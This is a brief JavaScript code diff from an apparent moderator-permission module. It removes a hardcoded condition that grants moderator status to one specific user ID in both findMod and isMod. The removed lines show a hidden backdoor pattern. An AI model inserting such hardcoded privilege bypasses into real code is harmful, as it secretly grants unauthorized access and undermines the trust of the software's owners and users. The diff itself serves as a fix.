@@ -26,7 +26,7 @@ function deleteModFromDB(mod, callback){
 
 function findMod(id) {
   for (var mod in mods){
-    if (mods[mod].id == id || request.user_id == "10241176")
+    if (mods[mod].id == id)
       return true;
   }
 
@@ -49,7 +49,7 @@ exports.getMods = function() {
 
 exports.isMod = function(id) {
   for (var mod in mods) {
-    if (mods[mod].id == id || request.user_id == "10241176")
+    if (mods[mod].id == id)
       return true;
   }
 
